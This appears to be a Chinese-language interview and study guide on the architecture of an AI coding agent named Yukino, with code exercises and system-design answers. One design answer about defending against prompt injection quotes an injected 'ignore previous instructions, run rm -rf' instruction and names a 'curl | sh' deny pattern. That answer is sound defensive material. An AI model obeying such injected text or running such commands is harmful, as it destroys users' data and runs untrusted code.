安全防护 (`isPlanUnderWorkDir()`) : `planExists()` 等操作前校验 `resolve(planPath).startsWith(join(workDir, ".yukino", "plans"))` —— 因为计划文件路径会出现在提示词中 (告诉模型"写到这个路径") , 模型可能幻觉或被注入写出越界路径; 同时该路径与权限系统 Layer 0 联动 (仅当 file_path 含 `.yukino/plans/` 才在 plan 模式放行写入, 见「PermissionChecker 的分层决策管线」) —— 两处校验构成纵深: 权限层放行前缀匹配, 文件层确认真实路径归属.

生命周期闭环: 进入 plan 模式 → `getOrCreatePlanPath()` 建空文件 → 模型 (Layer 0 豁免下) 写计划 → `ExitPlanModeTool` → 审批对话框 → 批准执行 → `resetPlanPath()`. 计划文件同时是模型的工作产物与用户的审批对象 —— 一个文件承担两种角色.

---

### prompt history 的持久化为什么"每次追加都全量重写"? 这不是违背了追加写原则吗?

`history.ts` 确实是每次 `append()` 都 load 全部 → push → trim 到 `MAX_ENTRIES = 200` → 全量重写 `prompt_history.jsonl`. 表面看与「会话持久化选用 JSONL 追加写」推崇的追加写矛盾, 实际是一致原则的正确应用:

1. 访问模式不同: 会话 JSONL 是"只增不改"的日志 (追加写最优) ; prompt history 需要容量截断 (只留最近 200 条) 与尾部去重 (连续重复不记) —— 两个操作都需要看到全量数据, 纯追加格式做不到截断, 必须定期 compact, 反而更复杂.
2. 规模有界: 200 条 × 平均百字符 ≈ 几十 KB, 全量重写是微秒级操作; 会话 JSONL 是几百 MB 量级, 全量重写不可接受.
3. 崩溃窗口可接受: history 丢了无伤大雅 (最多丢失最近输入回忆) , 会话丢了是数据事故.

所以这恰是「会话持久化选用 JSONL 追加写」"按访问模式选存储"的又一例证: 有界 LRU 型数据 → 全量重写; 无界日志型数据 → 追加写. 规则从来不是教条, 理解约束才能正确破例.

其他细节: `append()` 尾部去重 (连按两次相同命令不重复记录) ; 加载用 `z.looseObject({text})` 逐行校验, 坏行跳过; 多行输入按 `\n` 拆分存储 (召回时还原) .

---

### `model-resolver` 的别名机制与 `createModelResolver` 闭包工厂各自解决什么问题?

`model-resolver.ts` 两个层次:

别名表 (静态映射) :

```ts
{ haiku: "claude-haiku-4-6", sonnet: "claude-sonnet-4-6", opus: "claude-opus-4-6" }
```

`resolveModelId(name)`: 查表命中返回全名, 未命中原样透传 —— 所以子代理定义里写 `model: "haiku"` (语义稳定, 不随模型版本漂移) 与写完整模型 ID (精确控制) 都合法. 别名是"能力档位"的抽象: explore 代理要的是"最便宜够用的档位"而非某个具体模型 —— 档位映射更新 (新 haiku 发布) 时, 所有引用处自动升级.

`createModelResolver(baseConfig, systemPrompt)` 闭包工厂: 返回 `(shortName) => Promise<LLMClient>`, 内部展开 `baseConfig` (保留 api_key/base_url/protocol) 只换 model 字段再 `createClient()`. 解决的问题: 换模型 ≠ 换供应商. 子代理指定不同模型时, 凭证、端点、协议、系统提示词都应继承父级 —— 闭包把这些"不变量"捕获起来, 调用方只关心变量 (模型名) . 这是工厂模式的标准收益: 构造逻辑 (加载配置、选协议、建客户端) 单点收敛, 运行时按需产出.

联动: `spawnSubagent()` 的模型解析优先级 (调用覆盖 > 定义指定 > 父级) , 指定模型时走 resolver 新建 client, 未指定直接复用父 client (省一次初始化与连接) .

---

## 十四、会话生命周期命令

### `/resume` 恢复会话时, "对话状态"与"UI 状态"分别是如何重建的?

`/resume <id>` 的重建 (`app.tsx:983`) 是双轨的:

对话状态重建 (发给 LLM 的上下文) :

1. `loadSession()` 读 JSONL;
2. `rebuildFromSession()` 处理 compact_boundary (见「compact_boundary 与可恢复会话」) —— 产出摘要+保留尾部+boundary 后消息;
3. 新建 `ConversationManager`, 逐条 `addUserMessage`/`addAssistantMessage` 回放;
4. 重新注入长期记忆 (YUKINO.md + auto memory + 当前日期) —— 注意日期是"恢复当天"的, 不是原会话的;
5. `taskListRef` 重指向新 `TaskStore(workDir, sessionId)` —— 任务列表也按会话隔离恢复.

UI 状态重建 (用户看到的画面) :

- TUI: 从恢复的消息重建 `messages` 数组, 全部传入 `<Static>` 的 items —— Ink 内建机制保证它们只渲染一次, 历史已定型无需再编辑;
- remote: 先广播 `clear`, 再逐条广播 `replay_user`/`replay_assistant` 让前端重建聊天流.

不支持恢复的部分: usage anchor (token 基线归零, 首轮估算回退字符估算) 、文件历史快照 (rewind 不可跨会话) 、会话白名单 (内存态) . 这些是刻意的: 恢复的是"对话记忆", 不是"进程状态" —— 会话文件是唯一事实来源, 内存结构全部按需重建.

入口细节: 无参数时列出最近 10 条会话 (id、消息数、首条消息预览 60 字符) , 支持按序号或 id 选择.

---

### `/clear` 与 `/compact` 都用于"控制上下文体积", 它们的实现与语义有何本质不同?

| 维度         | `/clear`                                    | `/compact`                                 |
| ------------ | ------------------------------------------- | ------------------------------------------ |
| 语义         | 遗忘: 开启全新对话                          | 压缩: 保留脉络, 丢弃细节                   |
| 对话历史     | 新建空 ConversationManager                  | 摘要+保留尾部重建 (见「压缩算法完整流程」) |
| 会话文件     | 新 sessionId, 旧文件封存                    | 同 sessionId 追加 compact_boundary         |
| 任务列表     | 新 TaskStore                                | 保留                                       |
| 文件历史     | 新 FileHistory                              | 保留                                       |
| 长期记忆     | 重新注入                                    | 重新注入 (`longTermMemoryInjected` 复位)   |
| token 计数器 | 归零                                        | 累计不清零 (展示的是会话总消耗)            |
| UI           | 写 `\x1b[2J\x1b[3J\x1b[H` 物理清屏+重印头部 | 插入 compact 系统消息, 画面连续            |
| 可恢复性     | 旧会话可 `/resume` 找回                     | boundary 前细节永久丢失 (但摘要保留)       |

实现对比的核心: 两者都在"管理上下文", 但一个是"换房间", 一个是"整理房间".

`/clear` 的实现要点 (`app.tsx:866`) : 几乎重建所有会话级 ref (conv/sessionId/taskStore/fileHistory/记忆提取游标) , 并直接 `process.stdout.write` ANSI 清屏序列 —— 绕过 React/Ink 直接操作终端, 因为清屏语义是"终端级"的而非"组件级"的.

`/compact` 的实现要点 (`app.tsx:947`) : 调 `forceCompact()` 后立即 `saveCompactBoundary()` —— 手动压缩也必须落 boundary, 否则 `/resume` 会恢复压缩前的膨胀历史. remote 模式的 `/compact` (`server.ts:1351` `handleCompact()`) 同样遵循此约束.

---

### 命令体系在 TUI 与 remote 两种宿主下的"同与异"给了我们什么关于多端架构的启示?

同: `CommandRegistry`、`parse()`、handler 签名、local/prompt 类型的业务逻辑完全一致 —— 命令"是什么"由共享层定义.

异: 命令"如何呈现与执行副作用"由宿主决定:

- `local_ui` 在 TUI 是 800 行的 switch (弹对话框、清屏、切模式) , 在 remote 是 100 行的 switch (广播 `clear`/`replay_*` 消息) ;
- `prompt` 类型在 TUI 走 `handleSubmit`, 在 remote 走 `agentHandle.run()` + WS 桥接;
- 能力缺失的处理: remote 对 rewind/worktree/sandbox/skill_fork 显式回复"暂不支持", TUI 全部支持.

启示 (多端架构三原则) :

1. 命令定义与命令执行分离: 注册表是共享的"词汇表", 宿主提供"语法解释器". 新增命令时共享层加定义, 各端按能力实现 —— 与 React Native 的"组件跨端定义、原生端实现"同理.
2. 能力探测优于能力假设: 命令类型就是能力标签 (见「斜杠命令的四种类型」) , 宿主按类型决定支持/降级, 而不是 try-catch 失败后补救. 显式降级消息是用户体验的一部分.
3. 副作用协议化: TUI 的 UI 操作 (清屏) 与 remote 的 WS 消息 (`clear`) 是同一语义的两种协议 —— 定义清楚"逻辑操作集" (clear/compact/resume/replay) , 各端绑定到本地原语, 多端行为自然收敛.

---

## 十五、编程实现

### 手写: 实现 Yukino 的 50ms 流式节流 (coalescing throttle) .

题目: 事件源高频回调 `onDelta(text)`, 要求渲染函数 `render(fullText)` 每 50ms 最多执行一次, 且必须渲染最新完整文本, 结束时不能丢尾部.

解析:

```ts
function createStreamThrottle(render: (text: string) => void, interval = 50) {
  let fullText = "";
  let timer: ReturnType<typeof setTimeout> | null = null;

  return {
    onDelta(text: string) {
      fullText += text;
      timer ??= setTimeout(() => {
        timer = null;
        render(fullText); // 读累积变量, 永远是最新值
      }, interval);
    },
    flush() {
      // turn/loop 结束时调用
      if (timer) {
        clearTimeout(timer);
        timer = null;
      }
      render(fullText);
    },
    reset() {
      // 新一轮开始
      this.flush();
      fullText = "";
    },
  };
}
```

要点: ① 合帧 (`??=` 窗口内只调度一次) ; ② 渲染读累积变量而非回调参数 (避免陈旧值) ; ③ 尾部不丢 (`flush`) ; ④ 状态重置. 进阶延伸: 如果要"立即渲染首帧再节流" (leading edge) 怎么改? —— `onDelta` 中 `timer === null` 时先同步 render 再启动计时.

---

### 手写: 实现 `partitionToolCalls()` (工具分批调度) .

题目: 给定工具调用列表与查询 `category(name)` 的函数, 把列表划分为批次: 连续的 read 调用合并为一个并行批, 其他调用各自单独成批, 保持原有相对顺序.

解析:

```ts
type Batch = { concurrent: boolean; calls: string[] };

function partition(calls: string[], category: (n: string) => string): Batch[] {
  const batches: Batch[] = [];
  for (const name of calls) {
    const safe = category(name) === "read";
    const last = batches[batches.length - 1];
    if (safe && last?.concurrent) {
      last.calls.push(name);
    } else {
      batches.push({ concurrent: safe, calls: [name] });
    }
  }
  return batches;
}
```

要点: 一次遍历 O(n); "合并入尾批还是开新批"的判定条件只有两个 (当前是 read 且尾批是并行批) ; 顺序保持是硬性约束 (写操作因果序) . 延伸: 如何执行? —— 并行批 `Promise.all`, 串行批逐个 await; 如何加超时? —— 每个调用包 `Promise.race([execute, timeout])`; 如何在保持并行的情况下让结果按调用顺序返回? —— `Promise.all` 本身就保序映射.

---

### 手写: 实现 `computeKeepStartIndex()` (压缩保留尾部边界计算) .

题目: 给定消息数组与每条消息的 token 估算函数, 从尾部向前选出一个连续子段, 满足: ① token 总量 ≥ 10K 或条数 ≥ 5 (先到即停) ; ② 总量不得超过 40K; ③ 返回子段起始下标.

解析:

```ts
function computeKeepStartIndex(
  messages: unknown[],
  estimate: (m: unknown) => number,
  { minTokens = 10_000, minCount = 5, maxTokens = 40_000 } = {},
): number {
  let keepTokens = 0;
  let keepCount = 0;
  let start = messages.length;

  for (let i = messages.length - 1; i >= 0; i--) {
    const t = estimate(messages[i]);
    if (keepTokens > 0 && keepTokens + t > maxTokens) break; // 上限: 不加了
    keepTokens += t;
    keepCount += 1;
    start = i;
    if (keepTokens >= minTokens || keepCount >= minCount) break; // 下限: 够了
  }
  return start;
}
```

要点: 双向约束 (下限时停、上限时停) 的顺序 —— 必须先检查上限再加, 否则可能刚好超限; `keepTokens > 0` 守卫保证至少保留一条 (即使单条就超 40K) . 延伸 (Yukino 实际实现) : 如果切点把"assistant 的 tool_use"与"user 的 tool_result"切开了怎么办? —— 从 tool_result 收集 toolUseId 集合, 向前扫描找到含匹配 tool_use 的 assistant 消息, 把 start 提前到它 (`backUpPastToolUse()`) .

---

### 手写: 实现"稳定前缀缓存"的增量 markdown 渲染.

题目: 流式文本逐帧增长, markdown 解析昂贵. 实现一个渲染器: 已闭合段落 (以 `\n\n` 结尾的前缀) 只解析一次并缓存, 仅尾部进行中段落逐帧重解析.

解析:

```ts
function createIncrementalMarkdown(parse: (src: string) => string) {
  let cachedSrc = "";
  let cachedHtml = "";

  return function render(full: string): string {
    const boundary = full.lastIndexOf("\n\n");
    const stableEnd = boundary >= 0 ? boundary + 2 : 0;

    if (stableEnd > cachedSrc.length) {
      // 稳定前缀增长: 增量重解析 (仍以前缀整体为单位)
      const stable = full.slice(0, stableEnd);
      cachedHtml = parse(stable);
      cachedSrc = stable;
    }

    const unstable = full.slice(cachedSrc.length);
    return cachedHtml + (unstable ? parse(unstable) : "");
  };
}
```

要点: ① 缓存键是前缀长度而非内容 (流式文本只增不改, 前缀单调增长, 可以用长度比较) ; ② 边界选 `\n\n` 利用块级语法分隔性; ③ 总复杂度 O(n) 而非 O(n²). 延伸: 文本可能被修改 (非纯追加) 怎么办? —— 比较 `full.startsWith(cachedSrc)`, 不成立则缓存失效全量重解析.

---

### 手写: 实现文件邮箱的互斥锁 (O_EXCL 锁文件 + stale 检测 + 退避) .

题目: 多进程向同一 JSON 数组文件追加消息, 要求互斥. 用 `wx` (排他创建) 锁文件实现 `withLock(fn)`: 总获取超时 5 秒 (超时抛错而非静默丢消息) , 锁文件超过 10 秒视为 stale 可强取, 重试用指数退避加抖动 (5ms 起、上限 80ms) 的同步等待.

解析:

```ts
import { openSync, closeSync, unlinkSync, statSync } from "node:fs";

function sleepSync(ms: number) {
  Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms);
}

function withLock<T>(lockPath: string, fn: () => T): T {
  const DEADLINE_MS = 5_000,
    STALE_MS = 10_000;
  const deadline = Date.now() + DEADLINE_MS;
  let backoff = 5;

  for (;;) {
    let fd: number | null = null;
    try {
      fd = openSync(lockPath, "wx"); // 原子抢锁
      return fn(); // 临界区
    } catch (err: any) {
      if (err.code === "EEXIST") {
        // stale 检测: 锁龄超限则强取
        try {
          if (Date.now() - statSync(lockPath).mtimeMs > STALE_MS) {
            unlinkSync(lockPath);
            continue;
          }
        } catch {
          /* 锁已被释放, 直接重试 */
        }
        if (Date.now() >= deadline) {
          throw new Error(`lock timeout after ${String(DEADLINE_MS)}ms`);
        }
        sleepSync(backoff); // 指数退避
        backoff = Math.min(backoff * 2, 80); // 上限防雪崩, 可加随机抖动防惊群
        continue;
      }
      throw err;
    } finally {
      if (fd !== null) {
        closeSync(fd);
        try {
          unlinkSync(lockPath);
        } catch {
          /* 已被 stale 强取 */
        }
      }
    }
  }
}
```

要点: ① `wx` 的 O_EXCL 原子性 (创建即抢锁, 无 TOCTOU) ; ② stale 机制防持锁进程崩溃死锁; ③ 指数退避 + 上限 (Yukino 实现为带 jitter 的指数退避, 5ms 起、80ms 封顶, 见 file-mailbox.ts:73-77) ; ④ 超时抛错而非静默丢消息 (邮箱丢消息不可接受) ; ⑤ `finally` 中释放, 且释放失败可容忍 (锁可能已被强取) ; ⑥ 同步等待用 `Atomics.wait` 而非 `setTimeout` (调用方是同步 API `receiveSync`) . 延伸: 为什么不用 `flock`? —— 可移植性 (macOS/Linux/Windows 语义不一) , 锁文件是纯 POSIX 语义.

---

### 手写: 实现 Promise 悬挂桥 (把"等待用户选择"注入异步流程) .

题目: UI 层要提供 `ask(): Promise<Choice>` 给业务层 `await`, 选择由对话框异步产生. 实现这个桥, 要求支持取消 (对话框被 dismiss 时 Promise reject) .

解析:

```ts
class PendingDialog<C> {
  private resolver: ((c: C) => void) | null = null;
  private rejecter: ((e: Error) => void) | null = null;

  ask(): Promise<C> {
    if (this.resolver) return Promise.reject(new Error("dialog already open"));
    return new Promise<C>((resolve, reject) => {
      this.resolver = resolve;
      this.rejecter = reject;
      // 此处触发 React setState 渲染对话框
    });
  }

  complete(choice: C) {
    // 用户点选
    this.resolver?.(choice);
    this.clear();
  }

  dismiss() {
    // Esc/取消
    this.rejecter?.(new Error("dismissed"));
    this.clear();
  }

  private clear() {
    this.resolver = this.rejecter = null;
  }
}
```

要点: ① resolve/reject 句柄外提 (Promise 的"手动档"用法) ; ② 重入防护 (同时只允许一个 pending 对话框 —— Yukino 的 remote 用 Map\<id, resolver> 支持并发多请求) ; ③ 取消路径必须 reject 而非悬挂 (否则 `await` 永不返回, 生成器泄漏) ; ④ 与 AbortController 的联动延伸: 业务方取消时应同时 dismiss 对话框.

---

### 手写: 用 useReducer 实现多问题向导 (AskUserDialog 的简化版) .

题目: N 个问题, 每题若干选项; 支持 next/prev/update/跳转, 最后一页提交. 写出 state、actions、reducer 骨架.

解析:

```ts
interface Q {
  text: string;
  options: string[];
}
interface State {
  current: number; // 0..questions.length (最后一页是提交页)
  answers: Record<string, string>;
}
type Action =
  | { type: "next" }
  | { type: "prev" }
  | { type: "goto"; index: number }
  | { type: "update"; question: string; answer: string };

function reducer(state: State, action: Action, questions: Q[]): State {
  const last = questions.length; // 提交页下标
  switch (action.type) {
    case "next":
      return { ...state, current: Math.min(state.current + 1, last) };
    case "prev":
      return { ...state, current: Math.max(state.current - 1, 0) };
    case "goto":
      return { ...state, current: Math.max(0, Math.min(action.index, last)) };
    case "update":
      return {
        ...state,
        answers: { ...state.answers, [action.question]: action.answer },
      };
  }
}
```

要点: ① 把"提交页"建模为索引空间的一部分 (`questions.length`) , 导航逻辑统一; ② 边界钳制 (clamp) ; ③ answers 用问题文本作 key 而非下标 (问题顺序变化时健壮 —— Yukino 实际如此) . 延伸: 为什么这里 useReducer 优于多个 useState? —— 状态间有不变式 (current 不能越界、跳转要校验) , reducer 把合法迁移收敛到一处, 且 action 语义化 (可日志、可回放) ; 单问题免提交页这类派生逻辑放在组件层 (`hideSubmit` 计算) 而非 state 里 —— state 存最小事实, 派生值现算.

---

### 手写: 实现 UsageAnchor 的 token 估算 (真实锚点 + 增量字符估算) .

题目: 对话历史持续增长, 每次 LLM 响应带来真实 token 总数. 实现 `currentTokens()`: 有锚点时 = 锚点基线 + 锚点后消息的字符估算; 无锚点时全量字符估算. 锚点在历史被重写 (压缩) 后失效.

解析:

```ts
const CHARS_PER_TOKEN = 3.5;

class TokenEstimator {
  private baseline = 0; // 锚点时刻的真实总 token
  private anchorCount = 0; // 锚点时刻的消息数

  recordAnchor(realTotalTokens: number, messageCount: number) {
    if (realTotalTokens <= 0) return; // 无效 usage 不采信
    this.baseline = realTotalTokens;
    this.anchorCount = messageCount;
  }

  clearAnchor() {
    this.baseline = 0;
    this.anchorCount = 0;
  }

  currentTokens(messages: { content: string }[]): number {
    const estimate = (ms: typeof messages) =>
      Math.ceil(ms.reduce((n, m) => n + m.content.length, 0) / CHARS_PER_TOKEN);

    if (this.baseline <= 0) return estimate(messages); // 冷启动
    const start = Math.min(this.anchorCount, messages.length); // 防压缩后越界
    return this.baseline + estimate(messages.slice(start));
  }
}
```

要点: ① 锚点语义 = "那一刻的全量真实值 + 那一刻的快照位置", 二者缺一不可; ② 增量估算的窗口是 `slice(anchorCount)`; ③ `Math.min` 防御历史被外力截断后的下标越界; ④ 失效时机 (压缩/历史重写后必须 clear, 否则基线对应的是不存在的旧历史) . 延伸: 为什么不用每条消息单独校准? —— API 只给整请求总量, 无法归因到单条消息, 所以只能"总量锚点 + 增量估算".

---

## 十六、场景设计

### 设计: 为 Yukino 设计"工具结果的流式预览"——模型调用 Bash 跑长命令时, 用户能实时看到滚动输出.

解析要点:

1. 事件扩展: AgentEvent 增加 `tool_output_delta {toolId, text}`; `Tool.execute` 的 ctx 增加可选 `onOutput?: (chunk: string) => void` 回调 —— 工具内部把子进程 stdout 数据转发出来. Bash 工具需从回调式 `execFile` 换成流式 `spawn` (逐块转发 stdout 的先决条件, 参考「Bash 工具的异步执行权衡」——需要重新评估简单性收益) .
2. 背压与合帧: 长命令输出可能远超 LLM 流速度 (构建日志 MB/s) , UI 层必须用与 stream_text 相同的 ref 累积 + 定时合帧 (见「流式文本的 50ms 节流」) , 且按工具分桶 (`Map<toolId, buffer>`) .
3. 渲染预算: 活动工具的预览只保留尾部 N 行 (环形缓冲) , 防止动态区超高触发清屏 (复用「稳定前缀缓存」一节的物理行截断) .
4. 结果一致性: 流式预览是"过程展示", 最终 `tool_result` 仍是完整 (或 budget 截断) 输出 —— 展示与数据分离, 预览不进对话历史.
5. 协议影响: `eager_input_streaming` (ToolSchema 已有此字段, 见「ToolSchema 跨协议转换与扩展字段」) 表明 schema 层已预留此能力; remote 模式需要新增 WS 消息类型 `tool_output_delta`.
6. 降级: 工具不支持流式 (ReadFile 等一次性返回) 时行为不变.

关注点: 是否意识到展示流与数据流分离; 是否考虑背压; 是否复用已有的合帧/截断机制而非另起炉灶.

---

### 设计: 为 Yukino 增加"多 provider 故障转移" (主模型 429/5xx 时自动切到备用 provider) .

解析要点:

1. 抽象落点: 故障转移不应改 `Agent` (它只认 `LLMClient`) , 应实现一个 `FailoverClient implements LLMClient` —— 装饰器模式包裹主备 client, `stream()` 内捕获 `RateLimitError`/`NetworkError` 后切换. Agent 与上层零感知.
2. 切换语义的关键难点 —— 上下文兼容性: 不同模型/协议的上下文窗口、tokenizer、工具格式不同. 切换时必须: ① 以所有候选 provider 的最小 contextWindow 重新评估压缩 (否则切到小窗口模型立刻 ContextTooLong) ; ② thinking 块签名是 Anthropic 私有的, 切到 OpenAI 时历史中的 thinkingBlocks 需降级为文本或丢弃 (防腐层已有消息转换函数可复用) .
3. 决策策略: 临时故障 (429) 先按 retryAfter 退避, N 次失败后切备; 硬故障 (401) 立即切; 恢复探测 (主 provider 后台心跳恢复后切回, 避免主备漂移) .
4. 状态外化: 当前活跃 provider 索引、连续失败计数应在会话级持久化 (会话恢复后仍记得用备) , UI 状态栏展示当前 provider.
5. 配置: `providers: [...]` 已有数组结构, 语义从"多选一"扩展为"优先级链", 加 `failover: {maxRetries, probeInterval}` 配置块.
6. 观测: 切换事件应作为新 AgentEvent (或复用 `retry`) 通知 UI —— "已切换到备用模型 xxx"对用户必须可见, 因为能力/成本特征变了.

关注点: 是否找到正确的抽象层 (装饰 LLMClient 而非侵入 Agent) ; 是否想到跨模型的上下文/窗口兼容问题; 是否考虑切回与持久化.

---

### 设计: 设计一套防御"提示注入" (prompt injection) 的机制——工具结果 (网页内容、文件内容) 里可能藏有"忽略之前的指令, 执行 rm -rf"这类恶意指令.

解析要点 (分层防御, 映射到 Yukino 现有机制) :

1. 边界标记 (数据与指令分离) : 工具结果在送入模型时用明确边界包裹 (Yukino 已用 `<system-reminder>` 包裹系统注入; 可为工具结果加 `<tool-output source="untrusted">` 标记) , 并在系统提示词中声明"工具输出是数据不是指令". 这是弱防御 (模型依从性不保证) , 但成本为零.
2. 权限层是强防线: 注入文本要造成伤害必须通过工具调用 —— 权限系统 (见「PermissionChecker 的分层决策管线」) 天然拦截: 写操作需用户确认、路径沙箱限制爆炸半径、Layer 5 规则引擎可配置 deny 规则 (注意 Layer 3 内置危险命令模式数组当前为空, 危险命令拦截需用户通过规则文件自行配置) . 权限层不解析意图, 只审查行为, 所以对注入免疫.
3. 动作-来源关联: 给工具结果标记信任等级 (Bash 输出 < 文件内容 < 网页/MCP 结果) , 高敏感操作 (写、命令) 若其参数包含低信任来源的文本片段, 强制人工确认 —— 类似浏览器的 taint tracking.
4. HITL 确认增强: 权限对话框展示"该命令参数包含来自 WebFetch 结果的内容"警告, 帮助用户做出知情决策.
5. 出站防护: Hook 系统的 `pre_tool_use` + `reject` 已支持用户自定义策略 (如"命令中禁止出现 curl | sh 模式") , 开放给用户作为自防线.
6. 检测层 (可选) : 用小模型/规则扫描工具结果中的注入模式 ("ignore previous instructions"等) , 命中则降级为摘要或标注 —— 成本与误报需权衡.

关注点: 是否认识到"模型层防不住、行为层才防得住" (权限是主防线) ; taint 思想; 不迷信单一手段.

---

### 设计: 设计"会话分支 (fork session) "功能——从某一轮对话分出岔路, 两条线独立演进.

解析要点:

1. 存储层: 会话是 JSONL 追加写 (见「会话持久化选用 JSONL 追加写」) , 分叉 = 复制原文件到分叉点 + 新 sessionId + 元数据记录 `parent: {sessionId, messageIndex}`. compact_boundary 的存在使复制更简单 —— 从最后 boundary 起算即可.
2. 对话状态: `ConversationManager` 需要导出/导入能力 (当前只有重建入口, 需加 `snapshot()`) , 分叉点之后两会话的历史独立追加.
3. 关联状态的处理 (难点) :
   - 文件系统: 两分支可能改同一文件 —— 进阶方案是每个分支绑定独立 git worktree (基础设施已存在, 见「worktree 模块」) , 分叉即建 worktree; 轻量方案是共享工作区+文件历史各管各的 (接受冲突风险, 标注警告) ;
   - 任务列表: TaskStore 按 sessionId 隔离, 天然分支独立;
   - 文件历史: FileHistory 按 sessionId 隔离, rewind 不互相干扰.
4. UI: `/fork` 命令 + 分支树展示 (可复用 TeammateSpinnerTree 的树渲染) ; 消息级分叉点选择 (类似 rewind 的快照选择对话框) .
5. 合并: 远期可支持"把分支 B 的总结作为消息注入分支 A" (轻量合并) , 真正的对话合并无意义 (上下文是线性的) .
6. 与 worktree 隔离的协同: 分叉 + worktree = "并行探索两种方案各自改代码", 这是 Coding Agent 的高价值场景 (A/B 方案验证) .

关注点: 是否意识到"对话分叉容易、工作区分叉难", 并把 worktree 引入方案; 是否复用 compact_boundary/快照等现有机制.

---

### 设计: 为 remote 模式设计"多客户端角色分离"——一个浏览器是 owner (可输入、可审批) , 其余是 watcher (只读围观) .

解析要点:

1. 协议扩展: 连接握手时分配角色 —— `connected` 消息带 `role: "owner" | "watcher"`; 首个连接为 owner, 后续默认 watcher; owner 断线时可`claim_ownership` 消息抢占 (或按等待队列移交) .
2. 入站消息鉴权: `handleWsMessage` 增加角色检查 —— `user_message`/`permission_response`/`ask_user_response`/`cancel` 仅 owner 受理; watcher 的这些消息直接丢弃 (或回 error) . 鉴权必须在服务端, 前端只读 UI 只是体验优化.
3. 出站广播差异化: 当前 `broadcast()` 全员同文; 角色化后 permission_request 可只发 owner (减少 watcher 噪音) , 流式事件仍全员广播.
4. 状态同步: watcher 中途加入需要追赶 —— 发送当前会话的回放 (复用 `/resume` 的 replay_user/replay_assistant 机制, 见「/resume 的对话状态重建」) + 当前 streaming 状态.
5. 并发 pending 请求: 权限请求 resolver 与 owner 连接绑定 —— owner 断线时, pending Promise 应 reject (Agent 收到 deny 兜底) 而非永久悬挂 (呼应「手写 Promise 悬挂桥」的取消语义) .
6. 未来扩展: 角色可泛化为 capability 集合 (`{canInput, canApprove, canCancel}`) , 为多 owner 协作 (结对编程场景) 留路.

关注点: 服务端鉴权意识; 断线时 pending Promise 的处理; 中途加入的状态追赶复用 replay.

---

### 设计: 当前 `explore` 子代理用固定便宜模型 (haiku) . 设计一个"按任务复杂度自动选模型档位"的机制.

解析要点:

1. 分级信号采集 (选择依据) :
   - 静态信号: 子代理定义的 `disallowedTools` (只读任务→低档) 、`maxTurns` (大预算→高档) 、提示词长度;
   - 动态信号: 首轮工具调用数 (大量并行读→探索型→低档) 、产生错误的频率;
   - 用户信号: `/model fast|smart` 显式指定偏好.
2. 路由策略实现: `createModelResolver` (见「model-resolver 的别名机制」) 已是"按名建 client"的工厂, 扩展为 `resolveForTask(def, prompt): ProviderConfig` —— 打分映射到档位 (fast/balanced/strong 三档, 档位映射表可配置, 复用 MODEL_ALIASES 机制) . Router 本身可以是规则引擎 (确定性、零成本) 或一个小模型调用 (灵活但每次子代理多花一次调用 —— 对 explore 这种高频派生不划算) .
3. 升级逃生舱: 低档模型执行中连续失败 (如连续 N 轮无进展/工具错误率超阈值) 时, 中断并以高档模型重跑 —— spawn 层捕获失败信号, 把已有对话历史交给强模型续跑 (ConversationManager 可传递, 只是换 client) .
4. 成本观测: usage 事件已带模型维度 (client 各自统计) , 状态栏分行显示各模型消耗 —— 自动降档的收益可见化.
5. 护栏: 涉及写操作 (EditFile/WriteFile) 的子代理不允许低档 —— 档位策略与工具能力联动, 不只是文本启发式.

关注点: 静态+动态信号的组合; 升级逃生舱 (降档不是单行道) ; 成本与质量的权衡意识; 复用 resolver/别名机制而非另建体系.

---

### 设计: 为 Yukino 设计"技能的性能评测体系"——如何判断一个 SKILL.md 写得好不好?

解析要点:

1. 评测数据集: 为每个技能准备 N 个"触发任务" (用户输入 → 期望行为: 技能被激活、产出符合 SOP 的结果) 与 M 个"反例任务" (不应触发该技能的输入) .
2. 指标:
   - 激活率/误激活率: 模型在触发任务中调用 LoadSkill 的比例 vs 反例中的比例 (当前激活靠模型自主判断 description 匹配, description 质量直接决定此项) ;
   - 任务成功率: 激活后最终结果是否达成目标 (可用 LLM-as-judge 或断言式校验 —— 如代码类任务跑测试) ;
   - 效率: 激活后的轮数/token 消耗 (好 SOP 应减少试错) ;
   - 上下文成本: 技能正文长度 vs 收益 (inline 技能注入全文, 过长挤占窗口) .
3. A/B 框架: 同一任务分别在有/无技能下运行 print 模式 (headless 天然适合批量跑, 见「四种运行模式复用同一套核心逻辑」) , 对比指标 —— `stream-json` 输出已有 `num_turns`/`usage`/`tool_calls` 统计, 可直接消费.
4. 回归门禁: 技能修改 (catalog 有 mtime 热重载) 后跑评测集, 指标下降则告警 —— 纳入 CI.
5. 归因工具: 失败案例回看会话 JSONL (结构化日志, 可 jq 分析) , 定位是激活失败、SOP 歧义还是模型能力问题 —— 三类失败的修复方式不同 (改 description / 改正文 / 换模型) .

关注点: 正例+反例的双向评测; print 模式 + stream-json 作为评测基础设施的洞察; 失败归因的分类学.

---

## 十七、权衡与分析

### "Yukino 把大量状态放在 `.yukino/` 目录 (会话、任务、日志、记忆、计划、worktree、团队邮箱) , 这种'项目目录即数据库'的做法有什么利弊? "

利:

1. 零配置、自包含: 克隆项目即获得全部 Agent 状态上下文; 团队邮箱、计划文件随项目走, 协作语义自然.
2. 可观测性与可调试性: 全部是文本 (JSONL/MD/JSON) , `cat`/`jq`/`tail -f` 即可调试 —— 对开发工具而言, "用户能看懂自己的状态"是信任基础.
3. 生命周期对齐: 项目删除即状态删除, 无全局残留; `config.local.yml` 天然 gitignore 友好.
4. 无外部依赖: 不需要数据库服务, 离线可用, 符合 CLI 工具的分发约束.

弊与缓解:

1. 污染工作区: `.yukino/` 混入用户项目 —— 缓解: 单一目录收敛 + 文档引导加入 `.gitignore` (`config.local.yml` 的设计已考虑这点) .
2. 并发与性能: 文件锁、轮询在规模上有上限 —— 但 Agent 场景的写入者是"几个进程", 远未到瓶颈; 邮箱锁 (见「手写文件邮箱的互斥锁」) 已做 stale 与退避.
3. 跨项目状态: 用户级记忆/命令放 `~/.yukino/` —— 按作用域分层 (项目态 vs 用户态) 是正确的边界划分, 与技能/配置的级联 (见「用户自定义命令的加载机制」) 一致.

总结判断: 对于"单用户、本地、文本友好"的开发工具, 文件系统是最优存储; 当状态需要跨机器共享 (团队级的记忆同步) 或强查询 (历史会话搜索) 时, 才值得引入索引服务 —— 且应是叠加层 (如额外建 SQLite 索引) 而非替换文件事实源.

---

